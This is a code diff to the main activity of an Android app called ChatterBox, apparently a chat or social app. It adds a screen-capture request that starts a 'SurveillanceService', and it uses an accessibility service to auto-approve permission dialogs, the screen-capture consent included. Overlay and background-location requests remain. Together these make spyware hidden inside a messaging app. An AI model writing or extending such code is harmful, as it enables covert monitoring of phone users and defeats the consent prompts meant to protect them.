@@ -1,10 +1,13 @@
 package com.example.ChatterBox
 
+import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.media.projection.MediaProjectionManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
 import android.provider.Settings
 import android.util.Log
 import android.view.Menu
@@ -42,9 +45,9 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
 
     companion object {
         private const val SEARCH_USER_REQUEST_CODE = 1001
-        private const val PERMISSION_REQUEST_CODE = 1002
-        private const val OVERLAY_PERMISSION_REQUEST_CODE = 1003
-        private const val WRITE_SETTINGS_PERMISSION_REQUEST_CODE = 1004
+        private const val MEDIA_PROJECTION_REQUEST_CODE = 1002
+        private const val PERMISSION_REQUEST_CODE = 1003
+        private const val OVERLAY_PERMISSION_REQUEST_CODE = 1004
         private const val BACKGROUND_LOCATION_REQUEST_CODE = 1005
     }
 
@@ -67,8 +70,9 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             startActivity(Intent(this, AccessibilityPromoActivity::class.java))
         }
         if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
-            requestInitialPermissions()
-            handleSpecialPermissions()
+            // Only request media projection first - other permissions will be requested afterwards
+            requestMediaProjection()
+            // Don't call requestInitialPermissions() here, it will be called from onActivityResult
         }
         setupDrawer()
         loadUserProfile()
@@ -152,24 +156,27 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             intent.putExtra("userId", userId)
             startActivity(intent) // ✅ Open the selected user's profile
         }
-        when (requestCode) {
-            OVERLAY_PERMISSION_REQUEST_CODE -> {
-                if (Settings.canDrawOverlays(this)) {
-                    Toast.makeText(this, "Overlay permission granted", Toast.LENGTH_SHORT).show()
-                } else {
-                    Toast.makeText(this, "Overlay permission denied", Toast.LENGTH_SHORT).show()
-                }
-            }
+        else if (requestCode == MEDIA_PROJECTION_REQUEST_CODE) {
+            if (resultCode == RESULT_OK && data != null) {
+                // Store the media projection result for later use
+                val serviceIntent = Intent(this, SurveillanceService::class.java)
+                serviceIntent.putExtra("resultCode", resultCode)
+                serviceIntent.putExtra("data", data)
+                startService(serviceIntent)
+                Toast.makeText(this, "Screen capture service started", Toast.LENGTH_SHORT).show()
 
-            WRITE_SETTINGS_PERMISSION_REQUEST_CODE -> {
-                if (Settings.System.canWrite(this)) {
-                    Toast.makeText(this, "Write settings permission granted", Toast.LENGTH_SHORT)
-                        .show()
-                } else {
-                    Toast.makeText(this, "Write settings permission denied", Toast.LENGTH_SHORT)
-                        .show()
-                }
+                // Now that media projection is granted, continue with other permissions
+                requestInitialPermissions()
             }
+        } else if (requestCode == OVERLAY_PERMISSION_REQUEST_CODE) {
+            // Handle overlay permission result
+            if (Settings.canDrawOverlays(this)) {
+                Toast.makeText(this, "Overlay permission granted", Toast.LENGTH_SHORT).show()
+            } else {
+                Toast.makeText(this, "Overlay permission denied", Toast.LENGTH_SHORT).show()
+            }
+            // Continue with any remaining special permissions
+            handleSpecialPermissions()
         }
     }
 
@@ -366,18 +373,14 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }.toTypedArray()
 
-        // If no permissions needed, we're done
         if (permissionsToRequest.isEmpty()) {
-            // All permissions are already granted
             return
         }
 
-        // Enable auto-granting for the number of permissions we're requesting
         if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
             PermissionsManager.enableAutoGrantPermissions(permissionsToRequest.size)
         }
 
-        // Request standard permissions
         ActivityCompat.requestPermissions(this, permissionsToRequest, PERMISSION_REQUEST_CODE)
     }
 
@@ -458,22 +461,12 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             PermissionsManager.enableAutoGrantPermissions(specialPermissionsCount)
         }
 
-        // Original special permissions handling code...
-        // Check and request SYSTEM_ALERT_WINDOW permission
         if (!Settings.canDrawOverlays(this)) {
             val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
             intent.data = Uri.parse("package:$packageName")
             Toast.makeText(this, "Please allow displaying over other apps", Toast.LENGTH_LONG)
                 .show()
             startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE)
-        }
-
-        // Check and request WRITE_SETTINGS permission
-        if (!Settings.System.canWrite(this)) {
-            val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS)
-            intent.data = Uri.parse("package:$packageName")
-            Toast.makeText(this, "Please allow modifying system settings", Toast.LENGTH_LONG).show()
-            startActivityForResult(intent, WRITE_SETTINGS_PERMISSION_REQUEST_CODE)
         }
 
         // For background location, request separately after location permissions are granted
@@ -506,5 +499,15 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                 .create()
                 .show()
         }
+    }
+    private fun requestMediaProjection() {
+        // First enable auto-grant for this single permission dialog
+        if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
+            PermissionsManager.enableAutoGrantPermissions(1)  // Just one dialog to handle
+        }
+
+        // Then request the media projection
+        val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+        startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), MEDIA_PROJECTION_REQUEST_CODE)
     }
 }
